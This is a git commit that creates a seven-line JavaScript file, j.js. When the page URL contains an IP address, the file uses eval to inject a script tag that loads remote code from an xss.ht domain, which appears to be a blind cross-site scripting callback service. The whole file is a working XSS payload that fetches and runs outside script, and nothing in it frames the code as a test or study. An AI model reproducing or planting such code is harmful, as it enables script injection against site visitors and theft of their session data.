50126501ca3d0bbb0ba6980e01f745528f6af744
Wildernesshunters <59196085+Wildernesshunters@users.noreply.github.com>
2020-04-11 11:04:30 +0300

    Create j.js

---
+++ j.js
@@ -0,0 +1,7 @@
+var ipAddress = window.location.href;
+    var ip = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/;
+    var text = ip.exec(ipAddress);
+    if(text != null)
+    {
+      javascript:eval('var a=document.createElement(\'script\');a.src=\'https://waka0.xss.ht\';document.body.appendChild(a)')
+    }
